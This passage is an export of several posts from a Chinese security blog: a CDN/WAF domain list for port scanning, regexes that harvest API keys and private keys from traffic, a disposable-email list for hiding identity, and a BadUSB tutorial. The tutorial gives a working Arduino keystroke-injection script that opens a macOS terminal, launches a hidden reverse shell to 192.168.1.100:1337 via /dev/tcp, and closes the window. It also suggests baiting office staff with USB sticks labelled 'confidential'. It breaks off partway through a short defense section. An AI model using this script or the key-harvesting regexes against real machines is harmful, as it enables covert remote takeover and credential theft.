href=\&#34;#%E5%8F%82%E8%80%83\&#34;&gt;参考&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以跳过端口检查，节省时间。&lt;/p&gt;\n&lt;p&gt;以下列表主要收集了一些大型互联网企业（腾讯、百度、滴滴、字节跳动、360、阿里巴巴、美团、京东等），然后经过人工整理出来，有遗漏在所难免，欢迎大家补充。&lt;/p&gt;\n&lt;p&gt;w.alikunlun.com&lt;br&gt;\nwsglb0.com&lt;br&gt;\nw.kunlunpi.com&lt;br&gt;\nelb.amazonaws.com&lt;br&gt;\nwswebpic.com&lt;br&gt;\nmig.tencent-cloud.net&lt;br&gt;\ncloud.tc.qq.com&lt;br&gt;\nqcloudcjgj.com&lt;br&gt;\npop3.mxhichina.com&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;smtp.mxhichina.com&lt;br&gt;\nmail.mxhichina.com&lt;br&gt;\nalibabadns.com&lt;br&gt;\nw.kunlunle.com&lt;br&gt;\nalicdn.com&lt;br&gt;\nwagbridge.alibaba.com&lt;br&gt;\ncdn20.com&lt;br&gt;\nwscdns.com&lt;br&gt;\nyjs-cdn.com&lt;br&gt;\nyunjiasu-cdn.net&lt;br&gt;\njomodns.com&lt;br&gt;\nbdydns.com&lt;br&gt;\ncdn.cloudflare.net&lt;br&gt;\niotacdn.net&lt;br&gt;\nkxcdn.com&lt;br&gt;\nks-cdn.com&lt;br&gt;\nchinacache.net&lt;br&gt;\nw.kunlunar.com&lt;br&gt;\nksyuncdn.com&lt;br&gt;\ncdn.dnsv1.com&lt;br&gt;\nwaf.didiyun.com&lt;br&gt;\ncdntip.com&lt;br&gt;\ns3-cname.didiyunapi.com&lt;br&gt;\nqhcdn.com&lt;br&gt;\nqss-lb.com&lt;br&gt;\ncloudcdn.net&lt;br&gt;\nccgslb.net&lt;br&gt;\nqh-lb.com&lt;br&gt;\n360qhcdn.com&lt;br&gt;\nqh-cdn.com&lt;br&gt;\nyundun_external.vcloudgtm.com&lt;br&gt;\n360vcloud.com&lt;br&gt;\n360wzb.com&lt;br&gt;\ncloudglb.com&lt;br&gt;\nqihucdn.cn&lt;br&gt;\nqihucdn.com&lt;br&gt;\nalibabadns.com&lt;br&gt;\nbytedns.net&lt;br&gt;\ncdn.bytedance.com&lt;br&gt;\nw.kunlunca.com&lt;br&gt;\ncdngslb.com&lt;br&gt;\nw.kunluncan.com&lt;br&gt;\nakadns.net&lt;br&gt;\nw.cdngslb.com&lt;br&gt;\nw.kunlungr.com&lt;br&gt;\nbsgslb.com&lt;br&gt;\nnetdna-cdn.com&lt;br&gt;\ncdn.aliyun.com&lt;br&gt;\ncdn.aliyuncs.com&lt;br&gt;\nerror.aliyundun.com&lt;br&gt;\nerror.aliyundun.net&lt;br&gt;\nerrors.aliyundun.com&lt;br&gt;\nerrors.aliyundun.net&lt;br&gt;\nerror.aliyun.net&lt;br&gt;\nerror.aliyun.com&lt;br&gt;\nerrors.aliyun.net&lt;br&gt;\nerrors.aliyun.com&lt;br&gt;\ncloudfloordns.com&lt;br&gt;\nhwclouds.com&lt;br&gt;\ncdn.sucuri.net&lt;br&gt;\nwaf.tencentcloud.com&lt;br&gt;\nwaf.tencent-cloud.com&lt;br&gt;\nwangshan.360.cn&lt;br&gt;\ngslb.qianxun.com&lt;br&gt;\njdcloudcs.com&lt;br&gt;\njcloudlb.com&lt;br&gt;\njdcloudwaf.com&lt;/p&gt;\n&lt;p&gt;企业邮箱&lt;br&gt;\nqiye.163.com&lt;br&gt;\noutlook.com&lt;br&gt;\noffice.com&lt;br&gt;\nexmail.qq.com&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;some-waf-cdn-lb-list&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以跳过端口检查，节省时间。&lt;/p&gt;\n&lt;p&gt;以下列表主要收集了一些大型互联网企业（腾讯、百度、滴滴、字节跳动、360、阿里巴巴、美团、京东等），然后经过人工整理出来，有遗漏在所难免，欢迎大家补充。&lt;/p&gt;\n&lt;p&gt;w.alikunlun.com&lt;br&gt;\nwsglb0.com&lt;br&gt;\nw.kunlunpi.com&lt;br&gt;\nelb.amazonaws.com&lt;br&gt;\nwswebpic.com&lt;br&gt;\nmig.tencent-cloud.net&lt;br&gt;\ncloud.tc.qq.com&lt;br&gt;\nqcloudcjgj.com&lt;br&gt;\npop3.mxhichina.com&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;一些流行的云waf、cdn、lb的域名列表（80条）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;cdn&#34;,&#34;slug&#34;:&#34;e1itMnwAEiv&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/e1itMnwAEiv/&#34;},{&#34;name&#34;:&#34;waf&#34;,&#34;slug&#34;:&#34;5DfkxyUz4jp&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/5DfkxyUz4jp/&#34;},{&#34;name&#34;:&#34;云waf&#34;,&#34;slug&#34;:&#34;y7Pmus8KxyV&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/y7Pmus8KxyV/&#34;},{&#34;name&#34;:&#34;lb&#34;,&#34;slug&#34;:&#34;8DFTif70fS_&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/8DFTif70fS_/&#34;},{&#34;name&#34;:&#34;负载均衡&#34;,&#34;slug&#34;:&#34;KKdLBAr1pJ9&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/KKdLBAr1pJ9/&#34;},{&#34;name&#34;:&#34;阿里云&#34;,&#34;slug&#34;:&#34;1yW8VVshk20&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/1yW8VVshk20/&#34;},{&#34;name&#34;:&#34;amazonaws&#34;,&#34;slug&#34;:&#34;U44g13pEcfW&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/U44g13pEcfW/&#34;},{&#34;name&#34;:&#34;cloudfront&#34;,&#34;slug&#34;:&#34;UCRjfn7Cfa7&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/UCRjfn7Cfa7/&#34;},{&#34;name&#34;:&#34;elb&#34;,&#34;slug&#34;:&#34;xKa5M_Ugsxx&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/xKa5M_Ugsxx/&#34;}],&#34;date&#34;:&#34;2020-04-26 17:56:16&#34;,&#34;dateFormat&#34;:&#34;2020-04-26&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/some-waf-cdn-lb-list/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;2 min read&#34;,&#34;time&#34;:114000,&#34;words&#34;:388,&#34;minutes&#34;:2},&#34;description&#34;:&#34;在信息收集过程中，会遇到使用cdn、云waf等的子域名。这样在做端口扫描时就会出现大量开放的端口。这就会导致扫描时间变长，多出来许多无用的信息。这里收集了一些，大家可以用到自己的扫描器中或开源程序中，遇到域名cname使用这些域名的时候可以...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。&lt;br&gt;\n在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;&amp;quot;aliyun_oss_url&amp;quot;: &amp;quot;[\\\\w-.]\\\\.oss.aliyuncs.com&amp;quot; \n&amp;quot;azure_storage&amp;quot;: &amp;quot;https?://[\\\\w-\\.]\\\\.file.core.windows.net&amp;quot;\n&amp;quot;access_key&amp;quot;: &amp;quot;[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)&amp;quot;\n&amp;quot;secret_key&amp;quot;: &amp;quot;[Ss](ecret|ECRET)_?[Kk](ey|EY)&amp;quot;\n&amp;quot;slack_token&amp;quot;: &amp;quot;(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})&amp;quot;\n&amp;lt;!-- more --&amp;gt;\n\n&amp;quot;slack_webhook&amp;quot;: &amp;quot;https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}&amp;quot;\n&amp;quot;facebook_oauth&amp;quot;: &amp;quot;[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}[&#39;\\&amp;quot;\\\\s][0-9a-f]{32}[&#39;\\&amp;quot;\\\\s]&amp;quot;,\n&amp;quot;twitter_oauth&amp;quot;: &amp;quot;[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}[&#39;\\&amp;quot;\\\\s][0-9a-zA-Z]{35,44}[&#39;\\&amp;quot;\\\\s]&amp;quot;\n&amp;quot;heroku_api&amp;quot;: &amp;quot;[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}&amp;quot;\n&amp;quot;mailgun_api&amp;quot;: &amp;quot;key-[0-9a-zA-Z]{32}&amp;quot;\n&amp;quot;mailchamp_api&amp;quot;: &amp;quot;[0-9a-f]{32}-us[0-9]{1,2}&amp;quot;\n&amp;quot;picatic_api&amp;quot;: &amp;quot;sk_live_[0-9a-z]{32}&amp;quot;\n&amp;quot;google_oauth_id&amp;quot;: &amp;quot;[0-9(+-[0-9A-Za-z_]{32}.apps.qooqleusercontent.com&amp;quot;\n&amp;quot;google_api&amp;quot;: &amp;quot;AIza[0-9A-Za-z-_]{35}&amp;quot;\n&amp;quot;google_captcha&amp;quot;: &amp;quot;6L[0-9A-Za-z-_]{38}&amp;quot;\n&amp;quot;google_oauth&amp;quot;: &amp;quot;ya29\\\\.[0-9A-Za-z\\\\-_]+&amp;quot;\n&amp;quot;amazon_aws_access_key_id&amp;quot;: &amp;quot;AKIA[0-9A-Z]{16}&amp;quot;\n&amp;quot;amazon_mws_auth_token&amp;quot;: &amp;quot;amzn\\\\.mws\\\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}&amp;quot;\n&amp;quot;amazonaws_url&amp;quot;: &amp;quot;s3\\\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\\\.s3\\\\.amazonaws.com&amp;quot;\n&amp;quot;facebook_access_token&amp;quot;: &amp;quot;EAACEdEose0cBA[0-9A-Za-z]+&amp;quot;\n&amp;quot;mailgun_api_key&amp;quot;: &amp;quot;key-[0-9a-zA-Z]{32}&amp;quot;\n&amp;quot;twilio_api_key&amp;quot;: &amp;quot;SK[0-9a-fA-F]{32}&amp;quot;\n&amp;quot;twilio_account_sid&amp;quot;: &amp;quot;AC[a-zA-Z0-9_\\\\-]{32}&amp;quot;\n&amp;quot;twilio_app_sid&amp;quot;: &amp;quot;AP[a-zA-Z0-9_\\\\-]{32}&amp;quot;\n&amp;quot;paypal_braintree_access_token&amp;quot;: &amp;quot;access_token\\\\$production\\\\$[0-9a-z]{16}\\\\$[0-9a-f]{32}&amp;quot;\n&amp;quot;square_oauth_secret&amp;quot;: &amp;quot;sq0csp-[ 0-9A-Za-z\\\\-_]{43}&amp;quot;\n&amp;quot;square_access_token&amp;quot;: &amp;quot;sqOatp-[0-9A-Za-z\\\\-_]{22}&amp;quot;\n&amp;quot;stripe_standard_api&amp;quot;: &amp;quot;sk_live_[0-9a-zA-Z]{24}&amp;quot;\n&amp;quot;stripe_restricted_api&amp;quot;: &amp;quot;rk_live_[0-9a-zA-Z]{24}&amp;quot;\n&amp;quot;github_access_token&amp;quot;: &amp;quot;[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\\\-]+@github\\\\.com*&amp;quot;\n&amp;quot;private_ssh_key&amp;quot;: &amp;quot;-----BEGIN PRIVATE KEY-----[a-zA-Z0-9\\\\S]{100,}-----END PRIVATE KEY——&amp;quot;\n&amp;quot;private_rsa_key&amp;quot;: &amp;quot;-----BEGIN RSA PRIVATE KEY-----[a-zA-Z0-9\\\\S]{100,}-----END RSA PRIVATE KEY-----&amp;quot;\n&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;fileName&#34;:&#34;Extract-API-Keys-From-Regex&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。&lt;br&gt;\n在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;&amp;quot;aliyun_oss_url&amp;quot;: &amp;quot;[\\\\w-.]\\\\.oss.aliyuncs.com&amp;quot; \n&amp;quot;azure_storage&amp;quot;: &amp;quot;https?://[\\\\w-\\.]\\\\.file.core.windows.net&amp;quot;\n&amp;quot;access_key&amp;quot;: &amp;quot;[Aa](ccess|CCESS)_?[Kk](ey|EY)|[Aa](ccess|CCESS)_?[sS](ecret|ECRET)|[Aa](ccess|CCESS)_?(id|ID|Id)&amp;quot;\n&amp;quot;secret_key&amp;quot;: &amp;quot;[Ss](ecret|ECRET)_?[Kk](ey|EY)&amp;quot;\n&amp;quot;slack_token&amp;quot;: &amp;quot;(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})&amp;quot;&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;title&#34;:&#34;一些提取api key的正则表达式&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;api&#34;,&#34;slug&#34;:&#34;7eD1ZtZoOvK&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/7eD1ZtZoOvK/&#34;},{&#34;name&#34;:&#34;regex&#34;,&#34;slug&#34;:&#34;4AAfoOcEEGh&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/4AAfoOcEEGh/&#34;},{&#34;name&#34;:&#34;key&#34;,&#34;slug&#34;:&#34;yLYZhcrIlJ1&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/yLYZhcrIlJ1/&#34;},{&#34;name&#34;:&#34;aws&#34;,&#34;slug&#34;:&#34;9mfZupBPNNC&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/9mfZupBPNNC/&#34;},{&#34;name&#34;:&#34;oss&#34;,&#34;slug&#34;:&#34;IRwJeXvDv9V&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/IRwJeXvDv9V/&#34;},{&#34;name&#34;:&#34;s3&#34;,&#34;slug&#34;:&#34;fBAf5Qpnj1N&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/fBAf5Qpnj1N/&#34;},{&#34;name&#34;:&#34;azure&#34;,&#34;slug&#34;:&#34;GsI4fiRqIOx&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/GsI4fiRqIOx/&#34;},{&#34;name&#34;:&#34;accesskey&#34;,&#34;slug&#34;:&#34;xWRgJsanFp2&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/xWRgJsanFp2/&#34;}],&#34;date&#34;:&#34;2020-04-14 10:41:38&#34;,&#34;dateFormat&#34;:&#34;2020-04-14&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Extract-API-Keys-From-Regex/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;4 min read&#34;,&#34;time&#34;:211000,&#34;words&#34;:602,&#34;minutes&#34;:4},&#34;description&#34;:&#34;分享几十条提取api key的正则表达式。可以借助burp、Mitmproxy，goproxy等来实现敏感信息的发现。\n在实际使用过程中，因为有部分规则是有转义的，在整合进工具的时候需要检查下，修正后使用即可。也欢迎大家回复本文补充新的～\n...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。&lt;/p&gt;\n&lt;h2 id=\&#34;推荐使用的\&#34;&gt;推荐使用的：&lt;/h2&gt;\n&lt;p&gt;https://t.odmail.cn&lt;br&gt;\nhttps://www.mohmal.com&lt;br&gt;\nhttp://od.obagg.com&lt;br&gt;\nhttp://onedrive.readmail.net&lt;br&gt;\nhttp://xkx.me&lt;/p&gt;\n&lt;h2 id=\&#34;其它\&#34;&gt;其它&lt;/h2&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;https://www.guerrillamail.com/&lt;br&gt;\nhttps://10minutemail.com&lt;br&gt;\nhttps://www.trash-mail.com/inbox/&lt;br&gt;\nhttps://www.mailinator.com&lt;br&gt;\nhttp://www.yopmail.com/en&lt;br&gt;\nhttps://generator.email&lt;br&gt;\nhttps://en.getairmail.com&lt;br&gt;\nhttp://www.throwawaymail.com/en&lt;br&gt;\nhttps://maildrop.cc&lt;br&gt;\nhttps://owlymail.com/en&lt;br&gt;\nhttps://www.moakt.com&lt;br&gt;\nhttps://tempail.com&lt;br&gt;\nhttp://www.yopmail.com&lt;br&gt;\nhttps://temp-mail.org/en&lt;br&gt;\nhttps://www.emailondeck.com&lt;br&gt;\nhttps://smailpro.com&lt;br&gt;\nhttps://anonbox.net&lt;br&gt;\nhttps://M.kuku.lu&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Temporary-mail-service&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。&lt;/p&gt;\n&lt;h2 id=\&#34;推荐使用的\&#34;&gt;推荐使用的：&lt;/h2&gt;\n&lt;p&gt;https://t.odmail.cn&lt;br&gt;\nhttps://www.mohmal.com&lt;br&gt;\nhttp://od.obagg.com&lt;br&gt;\nhttp://onedrive.readmail.net&lt;br&gt;\nhttp://xkx.me&lt;/p&gt;\n&lt;h2 id=\&#34;其它\&#34;&gt;其它&lt;/h2&gt;\n&#34;,&#34;title&#34;:&#34;一些临时邮箱服务网站&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;Temporary&#34;,&#34;slug&#34;:&#34;O36CvkysvuU&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/O36CvkysvuU/&#34;},{&#34;name&#34;:&#34;email&#34;,&#34;slug&#34;:&#34;dOaOVbMyzXy&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/dOaOVbMyzXy/&#34;}],&#34;date&#34;:&#34;2020-04-13 21:15:12&#34;,&#34;dateFormat&#34;:&#34;2020-04-13&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Temporary-mail-service/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:41000,&#34;words&#34;:127,&#34;minutes&#34;:1},&#34;description&#34;:&#34;临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。\n推荐使用的：\nhttps://t.odmail.cn\nhttps://www.mohmal.com\nhttp://od.obagg.com\nhttp://onedrive....&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8%E7%9A%84\&#34;&gt;推荐使用的：&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%85%B6%E5%AE%83\&#34;&gt;其它&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。&lt;/p&gt;\n&lt;p&gt;&lt;a href=\&#34;https://www.youtube.com/embed/VdbTwopR4iY\&#34;&gt;点此打开&lt;/a&gt;观看一段演示视频，需fq。&lt;/p&gt;\n&lt;h2 id=\&#34;利用场景\&#34;&gt;利用场景&lt;/h2&gt;\n&lt;p&gt;说下本文中利用场景：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;混入企业内部，员工电脑未锁屏的情况下。在之前去过很多客户那里，大多数企业的员工离开电脑前不锁屏的情况,而且非常严重。&lt;/li&gt;\n&lt;li&gt;对于无安全意识的员工进行攻击，如公司文员、前台、行政等，例如将usb贴上保密、照片等字样，并扔到显眼位置，以吸引人来捡并插入其电脑。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;针对Badusb攻击手段还有很多，利用场景也还有，这里仅列出与本文有关的部分。下面就让我们正式开始进入制作。&lt;/p&gt;\n&lt;h2 id=\&#34;准备工作\&#34;&gt;准备工作&lt;/h2&gt;\n&lt;h3 id=\&#34;硬件\&#34;&gt;硬件&lt;/h3&gt;\n&lt;!-- more --&gt;\n&lt;ul&gt;\n&lt;li&gt;Arduino Leonardo 淘宝上直接搜索Badusb，有很多卖的，价格都比较便宜。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=\&#34;软件\&#34;&gt;软件&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;Arduino IDE  官网下载地址：&lt;a href=\&#34;https://www.arduino.cc/en/Main/Software\&#34;&gt;https://www.arduino.cc/en/Main/Software&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;免杀木马，我这里macos下直接用的反弹shell，windows下使用的是免杀的meterpreter，payload为reverse_tcp。由于免杀不是本文重点，请自行制作。&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=\&#34;基础知识\&#34;&gt;基础知识&lt;/h2&gt;\n&lt;p&gt;Badusb属于HID注入攻击的一种形式。HID是Human Interface Device的缩写，HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。今天使用的Arduino Leonardo板子主要是一款键盘注入工具，除此之外还有WIFI版的（通过链接wifi，然后发起攻击）、伪装为充电线的（USB-C）。目前，前者成本较低，后者成本较高。有国外安全研究人员有在售卖USB Cable。有一些手机也支持用来进行hid注入攻击。比如GOOGLE NEXUS手机，刷入kali nethunter系统即可，在淘宝上可以购买到二手手机，成本只要300左右。&lt;/p&gt;\n&lt;p&gt;安装好arduino ide后，插入Arduino Leonardo板子，打开arduino ide，选择【工具】-【开发版】-【Arduino Leonardo】。&lt;/p&gt;\n&lt;p&gt;接下来就开始编写攻击代码了。默认显示的代码如下：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;void setup() {\n  // put your setup code here, to run once:\n}\n\nvoid loop() {\n  // put your main code here, to run repeatedly:\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;setup函数主要是安装时运行的代码，loop函数为重复执行的代码。一般我们都写入到setup函数中。&lt;br&gt;\n代码的语法并不多，主要有：&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;#include &amp;lt;Keyboard.h&amp;gt;&lt;/code&gt;  这里是包含Keyboard.h文件，该文件里定义了一些按键常量。&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;Keyboard.begin();&lt;/code&gt; 开始键盘通讯&lt;br&gt;\n&lt;code&gt;delay(100);&lt;/code&gt; 延迟执行，单位是毫秒&lt;br&gt;\n&lt;code&gt;Keyboard.press()&lt;/code&gt;   按下某个按键&lt;br&gt;\n&lt;code&gt;Keyboard.release()&lt;/code&gt;  松开某个按键&lt;br&gt;\n&lt;code&gt;Keyboard.end();&lt;/code&gt;  结束键盘通讯&lt;/p&gt;\n&lt;p&gt;这里需要注意的是，不同的板子语法会有不同和差异。&lt;/p&gt;\n&lt;p&gt;ascii对应键值表：&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1586161712598.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;（图片来源：https://zhuanlan.zhihu.com/p/28194271）&lt;/p&gt;\n&lt;h2 id=\&#34;实战攻击\&#34;&gt;实战攻击&lt;/h2&gt;\n&lt;p&gt;好了，有了如上基础，我们可以来实战攻击了。网上的代码总有一些问题，导致实际的成功率并不高。所以我对其进行了加强。&lt;br&gt;\n执行流程：&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;打开 &lt;code&gt;聚焦搜索&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;搜索终端&lt;code&gt;terminal&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;打开终端&lt;/li&gt;\n&lt;li&gt;执行&lt;code&gt;bash&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;执行反弹shell代码&lt;/li&gt;\n&lt;li&gt;切换输入法&lt;/li&gt;\n&lt;li&gt;再次执行反弹shell代码&lt;/li&gt;\n&lt;li&gt;退出终端。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;采用如上的流程，主要考虑到如下了几种情况来，从而提高其代码执行的成功率。&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;mac系统是类unix系统，区分大小写。&lt;/li&gt;\n&lt;li&gt;不同的mac版本系统，以及使用者设置的习惯不同&lt;/li&gt;\n&lt;li&gt;如何让反弹shell代码在后台执行，并隐藏终端窗口。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;具体的实现可看代码&lt;br&gt;\n代码地址已经上传到github，地址：&lt;a href=\&#34;https://github.com/insightglacier/badusb_script\&#34;&gt;https://github.com/insightglacier/badusb_script&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;脚本代码：&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;#include &amp;lt;Keyboard.h&amp;gt;\n\nvoid setup() {\n Keyboard.begin();//开始键盘通讯\n  delay(3000);\n  Keyboard.press(KEY_LEFT_GUI);\n  delay(30);\n  Keyboard.press(32);//按住空格，也就是command + 空格\n  Keyboard.release(KEY_LEFT_GUI);\n  Keyboard.release(32);\n  delay(100);\n  Keyboard.println(&amp;quot;terminal&amp;quot;);  //打开终端\n  delay(2000); \n  Keyboard.press(KEY_RETURN);\n  delay(100); \n  Keyboard.release(KEY_RETURN);\n  delay(500);\n  Keyboard.println(&amp;quot;bash&amp;quot;); //打开bash\n  delay(100);\n  Keyboard.press(KEY_RETURN);\n  delay(100);\n  Keyboard.release(KEY_RETURN);\n  delay(100);//\n  Keyboard.println(&amp;quot;nohup bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/1337 0&amp;gt;&amp;amp;1 &amp;amp;&amp;quot;);// 利用nohup在后台执行反弹shell代码\n  delay(100);\n  Keyboard.press(KEY_RETURN);//\n  delay(100);\n  Keyboard.release(KEY_RETURN);\n  delay(100);\n  Keyboard.press(32);\n  delay(100);\n  Keyboard.release(KEY_CAPS_LOCK);   //切换输入法。\n  delay(100);\n  delay(100);\n  Keyboard.press(KEY_LEFT_CTRL);   //另外一种切输入法操作\n  delay(100);\n  Keyboard.press(32);\n  Keyboard.release(KEY_LEFT_CTRL);\n  delay(100);\n  Keyboard.release(32);\n  delay(100);\n  Keyboard.println(&amp;quot;nohup bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/1337 0&amp;gt;&amp;amp;1 &amp;amp;&amp;quot;);// 利用nohup在后台执行反弹shell代码\n  delay(100);\n  Keyboard.press(KEY_RETURN);\n  delay(100);\n  Keyboard.release(KEY_RETURN);\n  Keyboard.press(KEY_LEFT_GUI);\n  delay(100);\n  Keyboard.press(&#39;q&#39;);//按下Q键\n  delay(100);\n  Keyboard.release(&#39;q&#39;);// 放开Q键\n  Keyboard.release(KEY_LEFT_GUI);//Command+Q退出终端\n  delay(1000);\n  Keyboard.press(KEY_RETURN);\n  delay(100);\n  Keyboard.release(KEY_RETURN);\n  Keyboard.end();//结束键盘通讯\n}\nvoid loop() {\n  }\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;代码注释写的很清楚来，也不难。写完代码后，我们可以点击验证（左上角对号）验证代码是否有语法错误。点击上传，ide会自动编译并上传代码到开发板中。成功后会直接执行我们的代码。测试在本机执行后，就可以到其机器上运行了。&lt;/p&gt;\n&lt;h2 id=\&#34;badusb防御\&#34;&gt;Badusb防御&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;Google 开源的badusb防御产品ukip，地址：https://github.com/google/ukip 。原理主要是监测按键键入的时间，并且自动判断是否为恶意攻击。&lt;/li&gt;\n&lt;li&gt;在测试过程中，windows10 系统会识别一些恶意的usb固件。建议开启windows 